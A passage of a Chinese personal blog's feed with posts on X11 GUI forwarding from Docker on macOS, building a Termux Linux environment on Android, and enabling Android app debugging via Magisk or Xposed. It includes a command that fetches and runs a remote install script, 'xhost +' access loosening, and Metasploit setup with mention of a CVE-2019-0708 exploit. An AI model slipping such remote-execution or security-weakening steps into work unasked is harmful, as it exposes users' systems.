WARRANTY, to the extent permitted by</span></span><br><span class="line"><span class="string">applicable law.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$ firefox</span></span><br></pre></td></tr></table></figure><p><img src="/pics/使用X11在macOS上获得更好的体验/2.png" alt="可以远程打开GUI界面"></p><h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><p>Docker 现在已经是一个配置环境的利器，缺点就是只有 CLI，但可以通过 X11 在 Docker 中开启 GUI。首先需要获取本机 IP 地址，并添加到 X11 Server 的列表中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ IP=$(ifconfig en0 | grep inet | awk <span class="string">'$1=="inet" &#123;print $2&#125;'</span>)</span><br><span class="line">$ <span class="built_in">echo</span> <span class="variable">$IP</span></span><br><span class="line">$ xhost + <span class="variable">$IP</span></span><br></pre></td></tr></table></figure><p>通过参数 <code>-e</code> 覆盖容器内的环境变量 <code>DISPLAY=$IP:0</code>，并用 <code>-v</code> 参数挂载本地 <code>/tmp/.X11-unix</code> 到容器内部的同一位置，利用 Docker Hub 中提供的一个 Firefox 的镜像来启动装有 Firefox 浏览器的容器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name firefox -e DISPLAY=<span class="variable">$IP</span>:0 -v /tmp/.X11-unix:/tmp/.X11-unix jess/firefox</span><br></pre></td></tr></table></figure><p><img src="/pics/使用X11在macOS上获得更好的体验/3.png" alt="开启的效果"></p><h2 id="Upgrade"><a href="#Upgrade" class="headerlink" title="Upgrade"></a>Upgrade</h2><p>在 Docker 中使用 GDB 调试一般采用 tmux 来解决窗口的问题，很久之前看了 Swings 大佬的博客，发现了用 X11 来实现 GDB 弹窗的方法，这种感觉想想就爽。这里 XQuartz 主要作为一个新终端的承载器和 host 机器和 Docker 的通讯器。</p><p>和上面同理也是先获取 IP，再做一个环境变量的覆盖和 X11 文件的挂载，这里用我的镜像启动：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --rm --privileged -e DISPLAY=$IP:0 -v &quot;/tmp/.X11-unix:/tmp/.X11-unix&quot; -v &quot;$PWD:/root/tmp&quot; assassinq/pwn-machine-16.04:v8 /bin/bash</span><br></pre></td></tr></table></figure><p>然后终端需要设置一下字体的编码，测试的时候发现不改变编码弹窗的时候会发生乱码的情况：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> LANG=C.UTF-8</span><br></pre></td></tr></table></figure><p>同时，弹窗的终端使用的是 lxterminal，一个比较轻量级的终端。exp 里终端设置如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context.terminal = [<span class="string">"lxterminal"</span>, <span class="string">"-e"</span>]</span><br></pre></td></tr></table></figure><p>接下来就可以开始愉快地调试了：</p><p><img src="/pics/使用X11在macOS上获得更好的体验/4.png" alt="在Docker中GDB弹窗"></p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://blog.csdn.net/hdzhang_blog/article/details/80058559" target="_blank" rel="noopener">https://blog.csdn.net/hdzhang_blog/article/details/80058559</a><br><a href="https://bestwing.me/Docker-for-Mac-and-run-gdb-GUI-window.html" target="_blank" rel="noopener">https://bestwing.me/Docker-for-Mac-and-run-gdb-GUI-window.html</a><br><a href="http://blog.lujun9972.win/blog/2018/04/24/docker%E5%AE%B9%E5%99%A8%E4%B8%AD%E8%B7%91gui%E7%9A%84%E6%9C%80%E7%AE%80%E5%8D%95%E6%96%B9%E6%B3%95/index.html" target="_blank" rel="noopener">http://blog.lujun9972.win/blog/2018/04/24/docker%E5%AE%B9%E5%99%A8%E4%B8%AD%E8%B7%91gui%E7%9A%84%E6%9C%80%E7%AE%80%E5%8D%95%E6%96%B9%E6%B3%95/index.html</a><br><a href="https://sourabhbajaj.com/blog/2017/02/07/gui-applications-docker-mac/" target="_blank" rel="noopener">https://sourabhbajaj.com/blog/2017/02/07/gui-applications-docker-mac/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;X11 也叫做 X Window 系统，X Window 系统（X11 或 X）是一种位图显示的视窗系统。它是在 Unix 和 类 Unix 操作系统，以及 OpenVMS 上建立图形用户界面的标准工具包和协议，并可用于几乎所有已有的现代操作系统。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="macos" scheme="blog.b3ale.cn/tags/macos/"/>
    
  </entry>
  
  <entry>
    <title>使用Termux在Android上打造小型Linux服务器</title>
    <link href="blog.b3ale.cn/2020/03/01/%E4%BD%BF%E7%94%A8Termux%E5%9C%A8Android%E4%B8%8A%E6%89%93%E9%80%A0%E5%B0%8F%E5%9E%8BLinux%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>blog.b3ale.cn/2020/03/01/%E4%BD%BF%E7%94%A8Termux%E5%9C%A8Android%E4%B8%8A%E6%89%93%E9%80%A0%E5%B0%8F%E5%9E%8BLinux%E6%9C%8D%E5%8A%A1%E5%99%A8/</id>
    <published>2020-03-01T02:50:30.000Z</published>
    <updated>2020-03-04T01:46:16.813Z</updated>
    
    <content type="html"><![CDATA[<p>使用 Termux 可以在 Android 上获得极佳的终端体验。</p><a id="more"></a><p>一些基础按键就不记录了。然后在 Termux 上的包管理工具有 pkg 和 apt，和 Debian 的基本一样，对我们来说已经很熟悉了。下面只是做一些简短的记录，用于备份。</p><h1 id="oh-my-zsh"><a href="#oh-my-zsh" class="headerlink" title="oh-my-zsh"></a>oh-my-zsh</h1><p>在 Termux 手机界面上可以完美实现 oh-my-zsh 的 agnoster 主题，在 Github 上已经有人实现了对应的安装脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">"<span class="variable">$(curl -fsSL https://github.com/Cabbagec/termux-ohmyzsh/raw/master/install.sh)</span>"</span></span><br></pre></td></tr></table></figure><p>具体的安装过程也不列举了，装完后会让我们选主题和字体。成功之后根目录下会有一个 storage 目录，映射了手机系统上的一些文件夹，方便文件传输：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ ls -l storage</span><br><span class="line">total 24</span><br><span class="line">lrwxrwxrwx 1 u0_a146 u0_a146 26 Mar  1 12:45 dcim -&gt; /storage/emulated/0/DCIM</span><br><span class="line">lrwxrwxrwx 1 u0_a146 u0_a146 30 Mar  1 12:45 downloads -&gt; /storage/emulated/0/Download</span><br><span class="line">lrwxrwxrwx 1 u0_a146 u0_a146 30 Mar  1 12:45 movies -&gt; /storage/emulated/0/Movies</span><br><span class="line">lrwxrwxrwx 1 u0_a146 u0_a146 30 Mar  1 12:45 music -&gt; /storage/emulated/0/Music</span><br><span class="line">lrwxrwxrwx 1 u0_a146 u0_a146 30 Mar  1 12:45 pictures -&gt; /storage/emulated/0/Pictures</span><br><span class="line">lrwxrwxrwx 1 u0_a146 u0_a146 22 Mar  1 12:45 shared -&gt; /storage/emulated/0</span><br></pre></td></tr></table></figure><p>同样，我们可以给 QQ 的文件传输整一个软链接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /data/data/com.termux/files/home/storage/shared/tencent/QQfile_recv QQ</span><br></pre></td></tr></table></figure><p>如此一来，传输文件就方便了很多：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ls -al</span><br><span class="line">...</span><br><span class="line">lrwxrwxrwx 1 u0_a146 u0_a146   70 Mar  1 16:05 QQ -&gt; /data/data/com.termux/files/home/storage/shared/tencent/QQfile_recv</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>还能修改启动时的问候语：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp <span class="variable">$PREFIX</span>/etc/motd <span class="variable">$PREFIX</span>/etc/motd.bak</span><br><span class="line">vim <span class="variable">$PREFIX</span>/etc/motd</span><br></pre></td></tr></table></figure><p><img src="/pics/使用Termux在Android上打造小型Linux服务器/1.png" alt="修改后的问候语"></p><h1 id="Change-apt-sources"><a href="#Change-apt-sources" class="headerlink" title="Change apt-sources"></a>Change apt-sources</h1><p>给 apt 换个清华源：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> EDITOR=vi</span><br><span class="line">apt edit-sources</span><br></pre></td></tr></table></figure><p>修改为以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># The termux repository mirror from TUNA:</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/termux stable main</span><br></pre></td></tr></table></figure><h1 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h1><p>接下来装个 SSH，用电脑连上更方便地进行后续的安装。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt upgrade</span><br><span class="line">apt install openssh</span><br></pre></td></tr></table></figure><p>将电脑的公钥 push 到手机上：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb push ~/.ssh/id_rsa.pub /sdcard/authorized_keys</span><br></pre></td></tr></table></figure><p>在 Termux 中把电脑公钥放在 <code>.ssh</code> 目录下，并设置 authorized_keys 文件为拥有者只读。最后启动服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> .ssh</span><br><span class="line">mv /sdcard/authorized_keys .</span><br><span class="line">chmod 400 authorized_keys</span><br><span class="line">sshd</span><br></pre></td></tr></table></figure><p>在电脑上转发 adb 端口并连接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:8022 tcp:8022</span><br><span class="line">ssh localhost -p 8022</span><br></pre></td></tr></table></figure><h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><p>Python 必不可少。默认 Python 指 Python3，Python2 指 Python2：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install python2</span><br><span class="line">apt install python <span class="comment"># python3</span></span><br></pre></td></tr></table></figure><h1 id="IPython"><a href="#IPython" class="headerlink" title="IPython"></a>IPython</h1><p>IPython 的安装必须有 clang 的依赖，否则会报错：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt install clang</span><br><span class="line">pip install ipython</span><br><span class="line">pip3.6 install ipython</span><br></pre></td></tr></table></figure><h1 id="tsu"><a href="#tsu" class="headerlink" title="tsu"></a>tsu</h1><p>用 tsu 替代 su 可以完美实现 root 转换：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install tsu</span><br></pre></td></tr></table></figure><p><img src="/pics/使用Termux在Android上打造小型Linux服务器/2.png" alt="tsu使用效果"></p><h1 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h1><p>需要联（ke）网（xue）下载：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install unstable-repo</span><br><span class="line">apt install metasploit</span><br></pre></td></tr></table></figure><p>输入 msfconsole 可以查看效果：</p><p><img src="/pics/使用Termux在Android上打造小型Linux服务器/3.png" alt="打开MSF框架"></p><p>这个版本也已经有 CVE-2019-0708 的 EXP 了：</p><p><img src="/pics/使用Termux在Android上打造小型Linux服务器/4.png" alt="CVD-2019-0708的EXP"></p><h1 id="Termux-API"><a href="#Termux-API" class="headerlink" title="Termux-API"></a>Termux-API</h1><p>其它很多软件像是 Nmap、SQLMap 等等，还有 Github 上的项目都基本和 Linux 中一模一样，可以用 apt 还有 pip 等管理器进行安装。下面记录一下 Termux-API 这一工具。首先要安装一下 <a href="https://play.google.com/store/apps/details?id=com.termux.api" target="_blank" rel="noopener">Termux:API</a> 这一 APP，然后用 apt 安装命令行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install termux-api</span><br></pre></td></tr></table></figure><p>获取电池信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ termux-battery-status</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"health"</span>: <span class="string">"GOOD"</span>,</span><br><span class="line">  <span class="string">"percentage"</span>: 100,</span><br><span class="line">  <span class="string">"plugged"</span>: <span class="string">"PLUGGED_USB"</span>,</span><br><span class="line">  <span class="string">"status"</span>: <span class="string">"FULL"</span>,</span><br><span class="line">  <span class="string">"temperature"</span>: 22.700000762939453,</span><br><span class="line">  <span class="string">"current"</span>: -38757</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取相机信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ termux-camera-info</span><br></pre></td></tr></table></figure><p>获取与设置剪切板：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ termux-clipboard-set thisisassassinq</span><br><span class="line">$ termux-clipboard-get</span><br><span class="line">thisisassassinq</span><br></pre></td></tr></table></figure><p>获取通讯录列表：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ termux-contact-list</span><br></pre></td></tr></table></figure><p>拨打电话：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ termux-telephony-call 10001</span><br></pre></td></tr></table></figure><p>获取当前 Wi-Fi 连接信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ termux-wifi-connectioninfo</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"bssid"</span>: <span class="string">"02:00:00:00:00:00"</span>,</span><br><span class="line">  <span class="string">"frequency_mhz"</span>: 2412,</span><br><span class="line">  <span class="string">"ip"</span>: <span class="string">"192.168.101.68"</span>,</span><br><span class="line">  <span class="string">"link_speed_mbps"</span>: 144,</span><br><span class="line">  <span class="string">"mac_address"</span>: <span class="string">"02:00:00:00:00:00"</span>,</span><br><span class="line">  <span class="string">"network_id"</span>: 0,</span><br><span class="line">  <span class="string">"rssi"</span>: -53,</span><br><span class="line">  <span class="string">"ssid"</span>: <span class="string">"&lt;unknown ssid&gt;"</span>,</span><br><span class="line">  <span class="string">"ssid_hidden"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="string">"supplicant_state"</span>: <span class="string">"COMPLETED"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取最近一次 Wi-Fi 扫描信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ termux-wifi-scaninfo</span><br></pre></td></tr></table></figure><h1 id="nyancat"><a href="#nyancat" class="headerlink" title="nyancat"></a>nyancat</h1><p>彩虹猫是在 2011 年 4 月上传在 YouTube 的视频，并且迅速爆红于网络，并在 2011 年 YouTube 浏览量最高的视频中排名第五。这个视频内容为一只卡通的猫咪飞翔在宇宙中，身后拖出一条彩虹，并且配上了 UTAU 虚拟歌手桃音モモ所演唱的背景音乐。终端版本下载：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install nyancat</span><br></pre></td></tr></table></figure><p><img src="/pics/使用Termux在Android上打造小型Linux服务器/5.png" alt="nyancat效果"></p><h1 id="终端二维码"><a href="#终端二维码" class="headerlink" title="终端二维码"></a>终端二维码</h1><p>生成终端二维码（字体没选好，效果不太好）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"https://qianfei11.github.io"</span> | curl -F-=\&lt;- qrenco.de</span><br></pre></td></tr></table></figure><p><img src="/pics/使用Termux在Android上打造小型Linux服务器/6.png" alt="终端二维码效果"></p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://mushuichuan.com/2017/12/10/termux/" target="_blank" rel="noopener">https://mushuichuan.com/2017/12/10/termux/</a><br><a href="http://blackwolfsec.cc/2016/12/10/termux/" target="_blank" rel="noopener">http://blackwolfsec.cc/2016/12/10/termux/</a><br><a href="https://www.sqlsec.com/2018/05/termux.html" target="_blank" rel="noopener">https://www.sqlsec.com/2018/05/termux.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;使用 Termux 可以在 Android 上获得极佳的终端体验。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="android" scheme="blog.b3ale.cn/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>不同版本Android动态调试前打开调试开关简述</title>
    <link href="blog.b3ale.cn/2020/02/29/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACAndroid%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%89%8D%E6%89%93%E5%BC%80%E8%B0%83%E8%AF%95%E5%BC%80%E5%85%B3%E7%AE%80%E8%BF%B0/"/>
    <id>blog.b3ale.cn/2020/02/29/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACAndroid%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%89%8D%E6%89%93%E5%BC%80%E8%B0%83%E8%AF%95%E5%BC%80%E5%85%B3%E7%AE%80%E8%BF%B0/</id>
    <published>2020-02-29T02:13:37.000Z</published>
    <updated>2020-03-01T03:15:16.903Z</updated>
    
    <content type="html"><![CDATA[<p>手上有两台谷歌儿子，系统版本不同，开启动态调试的方法也不同。</p><a id="more"></a><h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>众所周知，最常规的方法就是在 AndroidManifest.xml 中的 application 标签中添加 <code>android:debuggable=&quot;true&quot;</code> 字段，然后再回编译、签名、安装、然后进行动态调试。但这种方法实在太麻烦了。</p><p>网上还有另外一种修改 Android prop 的工具 <a href="https://github.com/wpvsyou/mprop" target="_blank" rel="noopener">mprop</a>，用来修改 <code>default.prop</code> 中的 <code>ro.debuggable</code> 字段为 1（默认为 0）。因为 Android 系统初始化时，init 进程会解析系统属性文件，然后将其保存到内存中去，以便给所有应用提供服务（这种方法可以直接调试所有应用），所以在 init 进程的内存块中是存在这些属性的。在修改完成后要重启 adbd 进程，但这种方法的缺点是在每次开关机后需要重新修改。</p><p>最好的方法是能够直接安装一个程序，能够直接开启所有程序的调试，并且在开关机后也不需要重新设置。</p><h1 id="Android-4"><a href="#Android-4" class="headerlink" title="Android 4"></a>Android 4</h1><p>设备：Nexus 5</p><p>开启动态调试的要求是已 root，并且安装了 Xposed 框架。</p><h2 id="BDOpener"><a href="#BDOpener" class="headerlink" title="BDOpener"></a>BDOpener</h2><p><a href="https://github.com/riusksk/BDOpener" target="_blank" rel="noopener">BDOpener 下载链接</a></p><p>这里使用的是 BDOpener，这是一款 Xposed 的模块，用于修改程序的 debugable 选项，同时也支持开启备份选项，方便数据转移。只需要安装程序后，启用并重启手机，就能调试，可以用 monitor 来查看效果。</p><p><img src="/pics/不同版本Android动态调试前打开调试开关简述/1.png" alt="monitor查看效果"></p><h1 id="Android-9"><a href="#Android-9" class="headerlink" title="Android 9"></a>Android 9</h1><p>设备：Pixel XL</p><p>开启动态调试的要求是安装了 Magisk 框架（安装后默认 root）。因为 Xposed 的作者在 Android 6 后没有再更新，后来 Android 7 只出了非官方版本，尝试采用了 Magisk+Taichi 的方式来使用上面的 Xposed 模块，但安装了之后发现 Android UI 会在开机之后崩溃，所以尝试了另外一种方法。</p><h2 id="MagiskHidePropsConf"><a href="#MagiskHidePropsConf" class="headerlink" title="MagiskHidePropsConf"></a><a href="https://forum.xda-developers.com/apps/magisk/module-magiskhide-props-config-t3789228" target="_blank" rel="noopener">MagiskHidePropsConf</a></h2><p><a href="https://github.com/Magisk-Modules-Repo/MagiskHidePropsConf" target="_blank" rel="noopener">MagiskHidePropsConf 下载链接</a></p><p><a href="https://github.com/osm0sis/android-busybox-ndk" target="_blank" rel="noopener">Busybox 下载链接</a></p><p>MagiskHidePropsConf 是 Magisk 下的一个模块，可以用来修改系统中内存里的 props 值，并且永久生效，那么就可以用来修改 <code>ro.debuggable</code> 字段了。同时要求安装 Busybox for Android NDK 才能运行。操作如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">marlin:/ <span class="comment"># props</span></span><br><span class="line"></span><br><span class="line">Loading... Please <span class="built_in">wait</span>.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MagiskHide Props Config v5.2.2</span><br><span class="line">by Didgeridoohan @ XDA Developers</span><br><span class="line"></span><br><span class="line">=====================================</span><br><span class="line"> Updating fingerprints list</span><br><span class="line">=====================================</span><br><span class="line"></span><br><span class="line">Checking connection.</span><br><span class="line">No connection.</span><br><span class="line"></span><br><span class="line">MagiskHide Props Config v5.2.2</span><br><span class="line">by Didgeridoohan @ XDA Developers</span><br><span class="line"></span><br><span class="line">=====================================</span><br><span class="line"> Select an option below.</span><br><span class="line">=====================================</span><br><span class="line"></span><br><span class="line">1 - Edit device fingerprint</span><br><span class="line">2 - Device simulation (disabled)</span><br><span class="line">3 - Edit MagiskHide props</span><br><span class="line">4 - Add/edit custom props</span><br><span class="line">5 - Delete prop values</span><br><span class="line">6 - Script settings</span><br><span class="line">7 - Collect logs</span><br><span class="line">r - Reset all options/settings</span><br><span class="line">b - Reboot device</span><br><span class="line">e - Exit</span><br><span class="line"></span><br><span class="line">See the module readme or the</span><br><span class="line">support thread @ XDA <span class="keyword">for</span> details.</span><br><span class="line"></span><br><span class="line">Enter your desired option: 3</span><br><span class="line"></span><br><span class="line">MagiskHide Props Config v5.2.2</span><br><span class="line">by Didgeridoohan @ XDA Developers</span><br><span class="line"></span><br><span class="line">=====================================</span><br><span class="line"> MagiskHide props (active)</span><br><span class="line"> Select an option below:</span><br><span class="line">=====================================</span><br><span class="line"></span><br><span class="line">Change the sensitive props <span class="built_in">set</span> by MagiskHide.</span><br><span class="line"></span><br><span class="line">1 - ro.debuggable</span><br><span class="line">2 - ro.secure</span><br><span class="line">3 - ro.build.type</span><br><span class="line">4 - ro.build.tags</span><br><span class="line">5 - ro.build.selinux</span><br><span class="line">a - Change all props</span><br><span class="line">b - Go back to main menu</span><br><span class="line">e - Exit</span><br><span class="line"></span><br><span class="line">Pick several options at once by</span><br><span class="line">separating inputs with a comma.</span><br><span class="line">Example: 1,5,6</span><br><span class="line"></span><br><span class="line">See the module readme or the</span><br><span class="line">support thread @ XDA <span class="keyword">for</span> details.</span><br><span class="line"></span><br><span class="line">Enter your desired option: 1</span><br><span class="line"></span><br><span class="line">MagiskHide Props Config v5.2.2</span><br><span class="line">by Didgeridoohan @ XDA Developers</span><br><span class="line"></span><br><span class="line">=====================================</span><br><span class="line"> ro.debuggable</span><br><span class="line">=====================================</span><br><span class="line"></span><br><span class="line">Currently <span class="built_in">set</span> to 0.</span><br><span class="line"></span><br><span class="line">You currently have the safe value <span class="built_in">set</span>.</span><br><span class="line">Are you sure you want to change it to 1?</span><br><span class="line"></span><br><span class="line">Enter y(es), n(o) or e(xit): y</span><br><span class="line"></span><br><span class="line">MagiskHide Props Config v5.2.2</span><br><span class="line">by Didgeridoohan @ XDA Developers</span><br><span class="line"></span><br><span class="line">=====================================</span><br><span class="line"> Reboot - ro.debuggable</span><br><span class="line">=====================================</span><br><span class="line"></span><br><span class="line">Reboot <span class="keyword">for</span> changes to take effect.</span><br><span class="line"></span><br><span class="line">Do you want to reboot now (y/n)?</span><br><span class="line"></span><br><span class="line">Enter y(es), n(o) or e(xit): y</span><br><span class="line"></span><br><span class="line">Rebooting...</span><br></pre></td></tr></table></figure><p>重启后也可以动态调了，同样可以用 monitor 来验证有没有成功。</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://ai-sewell.me/2018/%E6%89%93%E5%BC%80%E8%B0%83%E8%AF%95%E5%BC%80%E5%85%B3%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95/" target="_blank" rel="noopener">https://ai-sewell.me/2018/%E6%89%93%E5%BC%80%E8%B0%83%E8%AF%95%E5%BC%80%E5%85%B3%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95/</a><br><a href="https://bbs.pediy.com/thread-248322.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-248322.htm</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;手上有两台谷歌儿子，系统版本不同，开启动态调试的方法也不同。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="re" scheme="blog.b3ale.cn/tags/re/"/>
    
      <category term="android" scheme="blog.b3ale.cn/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-MOBILE-新手练习区</title>
    <link href="blog.b3ale.cn/2020/02/20/%5BTODO%5D%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-MOBILE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/"/>
    <id>blog.b3ale.cn/2020/02/20/%5BTODO%5D%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-MOBILE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/</id>
    <published>2020-02-20T11:51:47.000Z</published>
    <updated>2020-03-15T09:07:03.243Z</updated>
    
